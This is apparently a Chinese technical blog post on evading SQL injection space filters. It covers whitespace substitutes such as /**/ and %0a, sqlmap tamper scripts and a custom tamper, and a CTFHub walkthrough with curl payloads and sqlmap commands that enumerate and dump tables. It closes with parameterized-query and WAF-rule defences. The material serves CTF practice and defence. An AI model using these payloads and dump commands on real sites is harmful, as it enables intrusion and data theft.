---
title: "SQL 注入空格过滤绕过：原理、手法与 sqlmap 实战"
date: 2026-06-03T23:00:00+08:00
draft: false
tags: ["CTF", "Web安全", "SQL注入", "WAF绕过", "sqlmap", "空格过滤"]
categories: ["技术笔记"]
---

## 一、什么是空格过滤

空格过滤是指目标系统（WAF、Web 应用代码或中间件）对 HTTP 请求中的空格字符进行**检测、替换或删除**，以阻止 SQL 注入攻击的一种防御手段。

### 1.1 过滤的实现方式

**代码层面**

```php
// 直接删除所有空格
$input = str_replace(" ", "", $_GET['id']);

// 替换为空
$input = str_replace(" ", "", $_GET['id']);

// 正则匹配删除所有空白字符
$input = preg_replace('/\s+/', '', $_GET['id']);
```

**WAF 层面**

WAF 规则检测到 SQL 关键字（如 `UNION`、`SELECT`、`AND`）前后存在空格时，直接拦截请求。例如：

```
规则：IF (request_body CONTAINS "UNION SELECT") THEN BLOCK
```

此时攻击者如果不使用空格，而是写成 `UNION/**/SELECT`，规则可能无法匹配。

### 1.2 为什么空格是关键

SQL 语句的语法结构依赖空格作为分隔符：

```sql
SELECT id, name FROM users WHERE id = 1 AND status = 'active'
        ↑    ↑         ↑      ↑   ↑ ↑   ↑       ↑
      空格分隔关键字、标识符、运算符
```

当空格被删除后：

```sql
SELECTid,nameFROMusersWHEREid=1ANDstatus='active'
```

整条语句变成一团，MySQL 解析器无法识别各个 token，SQL 注入 payload 失效。

---

## 二、空格过滤的绕过手法

空格过滤并非不可突破。SQL 解析器认可的「空白等价物」远不止空格一种。

### 2.1 注释符 `/**/`

MySQL 支持 C 风格的多行注释 `/**/`，注释内容可以为空，效果等同于一个空格：

```sql
-- 原始
UNION SELECT 1,2,3

-- 绕过
UNION/**/SELECT/**/1,2,3
```

**优点**：通用性强，几乎所有场景可用。
**缺点**：部分 WAF 会检测 `/**/` 模式并拦截。

### 2.2 URL 编码换行 `%0a`

HTTP 请求中，换行符（LF，`\n`）经 URL 编码为 `%0a`，SQL 解析器将其视为有效的 token 分隔符：

```sql
-- 绕过
UNION%0aSELECT%0a1,2,3
```

**优点**：WAF 通常不拦截换行符。
**缺点**：如果目标用 `preg_replace('/\s+/', '', $input)` 过滤了所有空白字符（`\s` 包含换行），则失效。

### 2.3 Tab 字符 `%09`

Tab（`\t`）同样被 SQL 解析器视为分隔符：

```sql
UNION%09SELECT%091,2,3
```

### 2.4 括号 `()`

通过括号包裹子查询或表达式，可以在不使用空格的情况下构造合法 SQL：

```sql
-- 原始
SELECT * FROM users WHERE id = 1 AND 1 = 1

-- 绕过
SELECT(*)FROM(users)WHERE(id=1)AND(1=1)

-- 子查询包裹
SELECT(1)FROM(DUAL)WHERE(1)=(1)
```

**优点**：不依赖任何空白字符，纯粹的语法技巧。
**缺点**：构造复杂，可读性差，某些场景无法完全替代空格。

### 2.5 `+` 号（URL 上下文中）

在 URL 查询字符串中，`+` 会被解析为空格。但此技巧仅在**服务端将 `+` 解码为空格**时有效，且 SQL 语句内部并不识别 `+` 作为分隔符，所以适用范围有限：

```
?id=1+UNION+SELECT+1,2,3
```

**注意**：这只是 URL 编码层面的技巧，并非 SQL 语法层面的绕过。

### 2.6 反引号与引号技巧

在 MySQL 中，反引号包裹的标识符前后可以不需要空格：

```sql
SELECT`id`FROM`users`WHERE`id`=1
```

但这只适用于标识符，不适用于关键字（如 `SELECT`、`FROM` 本身不能用反引号包裹来省略空格）。

### 2.7 综合对比

| 绕过方式 | 示例 | 适用数据库 | 对抗 `preg_replace('/\s+/', '')` |
|---------|------|-----------|--------------------------------|
| `/**/` | `UNION/**/SELECT` | MySQL/MSSQL/Oracle | 有效 |
| `%0a` | `UNION%0aSELECT` | 通用 | **无效**（`\s` 包含换行） |
| `%09` | `UNION%09SELECT` | 通用 | **无效**（`\s` 包含 Tab） |
| `()` | `SELECT(1)FROM(DUAL)` | 通用 | 有效 |

**核心策略**：如果目标只删普通空格，用 `/**/` 最方便；如果目标删所有空白字符（`\s+`），用括号包裹。

---

## 三、sqlmap 自动化绕过

sqlmap 内置了数十个 **tamper 脚本**，专门用于自动化绕过各类过滤和 WAF。

### 3.1 查看所有 tamper

```bash
python sqlmap.py --list-tampers
```

### 3.2 空格过滤相关 tamper

| tamper 脚本 | 功能 | 适用场景 |
|------------|------|---------|
| `space2comment` | 空格 → `/**/` | 最常用，通用性强 |
| `space2randomblank` | 空格 → 随机空白字符（`%0a`、`%0d`、`%09`） | 对抗简单空格过滤 |
| `space2plus` | 空格 → `+` | URL 参数场景 |
| `space2mssqlblank` | 空格 → MSSQL 特有空白字符 | SQL Server 环境 |
| `between` | `>`、`=` 等 → `BETWEEN ... AND ...` | 配合空格绕过 |

### 3.3 使用方法

**单个 tamper**

```bash
python sqlmap.py -u "http://target.com/?id=1" \
  --tamper=space2comment \
  --batch
```

**多个 tamper 叠加**

```bash
python sqlmap.py -u "http://target.com/?id=1" \
  --tamper=space2comment,between \
  --batch
```

tamper 按顺序依次处理 payload，前一个的输出作为后一个的输入。

### 3.4 自定义 tamper

如果内置 tamper 不够用，可以编写自己的 tamper 脚本，放在 `tamper/` 目录下：

```python
# tamper/custom_space.py
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """用括号包裹所有空格分隔处"""
    if payload:
        payload = payload.replace(" ", "/**/")
    return payload
```

使用：

```bash
python sqlmap.py -u "http://target.com/?id=1" \
  --tamper=custom_space \
  --batch
```

---

## 四、实操：CTFHub 过滤空格题目

### 4.1 题目信息

- **平台**：CTFHub
- **题目**：过滤空格
- **目标**：`http://challenge-c96524a38aaae11e.sandbox.ctfhub.com:10800/?id=1`

### 4.2 手工验证

```bash
# 正常请求
curl -s "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1"

# 带空格的 payload（被过滤，页面返回异常或空）
curl -s "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1' AND 1=1"

# 用 /**/ 替换空格（绕过成功）
curl -s "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1'/**/AND/**/1=1"
```

### 4.3 sqlmap 自动检测

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
  --tamper=space2comment \
  --batch
```

sqlmap 输出：

```
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3724 FROM (SELECT(SLEEP(5)))jOAZ)
```

> 注意：session 中显示的 payload 是原始版本，实际发出的请求已被 tamper 处理为 `id=1/**/AND/**/(SELECT/**/3724/**/FROM/**/(SELECT(SLEEP(5)))jOAZ)`。

### 4.4 利用流程

**Step 1：枚举表名**

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
  --tamper=space2comment \
  --batch --threads=10 \
  --tables
```

**Step 2：枚举列名**

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
  --tamper=space2comment \
  --batch --threads=10 \
  -D sqli -T <表名> --columns
```

**Step 3：Dump flag**

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
  --tamper=space2comment \
  --batch --threads=10 \
  -D sqli -T <表名> -C <列名> --dump
```

**加速技巧**：time-based blind 默认延迟 5 秒，CTF 网络通常稳定，可以缩短为 2-3 秒：

```bash
python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
  --tamper=space2comment \
  --time-sec=2 \
  --flush-session \
  --batch --threads=10 \
  --tables
```

| 参数 | 说明 |
|------|------|
| `--time-sec=2` | 延迟时间从 5 秒缩短为 2 秒 |
| `--flush-session` | 清空之前的 session，用新的延迟时间重新检测 |

---

## 五、防御建议

### 5.1 不要依赖过滤空格

过滤空格是一种**治标不治本**的防御手段：
- 攻击者可以用 `/**/`、`%0a`、括号等多种方式绕过
- 维护过滤规则的成本高，容易漏掉新的绕过手法
- 误杀正常请求（如用户输入中包含合法空格）

### 5.2 正确的防御：参数化查询

```php
// 错误：拼接
$id = str_replace(" ", "", $_GET['id']);
$sql = "SELECT * FROM users WHERE id = '$id'";

// 正确：参数化查询
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

参数化查询从根本上消除了注入的可能性，无论攻击者如何绕过空格过滤都无济于事。

### 5.3 WAF 规则的补充

如果必须使用 WAF，规则应覆盖常见的空格绕过方式：

```
# 检测 /**/ 注释作为空格替代品
if (request CONTAINS "/*" AND request CONTAINS "*/") THEN inspect

# 检测 URL 编码的换行和 Tab
if (request CONTAINS "%0a" OR request CONTAINS "%09") THEN inspect

# 检测连续的 SQL 关键字（无空格分隔）
if (request CONTAINS "UNIONSELECT" OR request CONTAINS "SELECTFROM") THEN block
```

但需注意：**规则越复杂，误杀率越高**，参数化查询仍然是最可靠的方案。

---

## 六、总结

空格过滤是 Web 应用防御 SQL 注入的常见手段，但它**无法真正阻止注入**，只能增加攻击者的构造成本。

关键记忆点：

1. **`/**/` 是最通用的空格替代品**，sqlmap 的 `space2comment` tamper 一键搞定
2. **如果 `\s+` 过滤了所有空白字符**，尝试用括号 `()` 包裹表达式
3. **sqlmap 的 tamper 可以叠加使用**，如 `--tamper=space2comment,between`
4. **time-based blind 可以用 `--time-sec` 缩短延迟**，CTF 场景建议设为 2-3 秒
5. **过滤空格治标不治本**，参数化查询才是根本防御

理解空格过滤的绕过原理，能够帮助安全测试人员在遇到 WAF 或代码层过滤时，快速找到替代方案，继续完成注入检测与利用。
